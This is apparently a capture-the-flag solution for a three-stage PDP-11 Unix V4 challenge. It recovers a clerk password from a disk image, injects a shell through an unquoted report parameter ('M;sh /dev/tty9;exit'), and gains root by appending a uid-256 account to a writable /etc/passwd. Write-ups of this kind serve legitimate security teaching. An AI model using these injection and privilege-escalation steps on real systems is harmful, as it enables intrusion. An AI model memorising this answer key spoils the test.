# Old Town Accounts solution

## 1. PDP-11 After Dark I: The Night Clerk

Boot `handout/old-town-accounts.rk` under a PDP-11/45 or inspect its V4
filesystem. The intended evidence chain is:

1. `/usr/ellis/desk.note` identifies the nightly close procedure.
2. `/usr/ledger/night.conf` identifies login role `clerk` and account `0317`.
3. `/usr/adm/close.msg` says account 0317 was omitted from the typed close.
4. `/usr/adm/watch.oct` records the watchword octets for that account.
5. `/usr/ledger/manual` explains how those octets are decoded.

You can also inspect the raw image without booting it. From the challenge
directory, use `strings` to find the readable notes and watchword table:

```sh
binwalk handout/old-town-accounts.rk
strings -a handout/old-town-accounts.rk | less
strings -a handout/old-town-accounts.rk | grep -A 8 -B 3 '0317'
```

Search in `less` for `login role`, `OMITTED`, and `0317`. Correlate the
still-open account 0317 with its watchword table row, `0317      lantern`,
and the note identifying the login role as `clerk`. Other accounts and old
credentials are distractors. `binwalk handout/old-town-accounts.rk` can help
triage the image, but automatic extraction may not recognize this historical
V4 filesystem; a missing signature does not mean there is no readable evidence.

The recovered live credential is `clerk` / `lantern`. Log into the browser
terminal. The Nightly Balance Report prints the primary runtime flag.

## 2. PDP-11 After Dark II: Off the Books

The ledger's notices include Technical Bulletin 7. Journal entry 1041 reaches
a retired report path. Its implementation is effectively:

```sh
grep $1 /usr/ledger/rindex
```

The report type is inserted into the shell command without quoting. Enter this
as the report type:

```text
M;sh /dev/tty9;exit
```

The injected shell shares the browser's DLI terminal. Read the clerk mailbox:

```sh
cat /usr/clerk/mailbox
```

It contains the `ledger-escape` runtime flag.

## 3. PDP-11 After Dark III: The Proprietor's Copy

`/etc/passwd` is deliberately writable. This shell predates `>>`, and V4 `ed`
is interactive, so append an account with it:

```text
ed /etc/passwd
$a
owner::256:256::/tmp:
.
w
q
```

Send EOF to leave the injected shell, choose `6` to sign off from the ledger,
and log in as `owner` with no password.

The old kernel stores the parsed uid and gid in eight-bit fields. Decimal 256
therefore truncates to zero, so the new account receives root credentials.
Read the final file:

```sh
cat /proprietor
```

It contains the `proprietor` runtime flag.

## Implementation notes

The live kernel has eight floating KL/DL11 lines and maps DLI line 0 to
`/dev/tty9`. Its `klopen()` default omits the historical `LCASE` compatibility
flag so literal lowercase and braces survive after the exploit reopens the
line. The gateway wakes getty with lowercase bogus input, not an empty return,
for the same reason.

Each flag occupies one unique 128-byte, space-padded slot in the immutable
master. The gateway rejects missing, malformed, duplicated, or oversized
values and refuses a master containing a real flag. It patches only a private
per-session RK05 copy.
